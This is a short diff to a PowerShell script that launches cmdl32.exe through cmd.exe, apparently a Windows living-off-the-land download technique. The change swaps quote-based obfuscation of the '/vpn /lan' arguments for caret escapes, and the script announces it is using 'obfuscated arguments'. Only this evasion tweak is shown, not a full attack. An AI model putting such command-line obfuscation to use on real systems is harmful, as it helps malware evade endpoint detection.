@@ -42,7 +42,7 @@ if (!(Test-Path -Path $cmdl32Path)) {
 Write-Host "[*] Using cmdl32.exe at: $cmdl32Path"
 
 # Define the arguments with obfuscation using quotes within the command
-$arguments = "/c $cmdl32Path /v`"p`"n /l`"a`"n `"$tempDir\settings.txt`""
+$arguments = "/c $cmdl32Path /v^p^n /l^a^n `"$tempDir\settings.txt`""
 
 Write-Host "[*] Starting cmd.exe with obfuscated arguments: $arguments"
 
